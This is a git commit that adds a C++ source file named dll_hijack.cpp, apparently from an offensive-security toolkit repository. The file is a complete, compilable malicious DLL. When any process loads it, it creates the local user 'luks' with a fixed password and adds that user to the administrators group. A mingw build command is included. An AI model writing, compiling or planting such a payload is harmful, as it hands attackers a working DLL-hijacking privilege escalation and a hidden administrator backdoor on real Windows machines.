0d6c0c49f46cfe6307bf7f1bb44c310fcc158908
Luks <51793738+0xLuks@users.noreply.github.com>
2023-04-23 16:24:08 +0200

    Create dll_hijack.cpp

---
+++ Windows/System/dll_hijack.cpp
@@ -0,0 +1,26 @@
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+            i = system ("net user luks password123! /add");
+            i = system ("net localgroup administrators luks /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+// x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
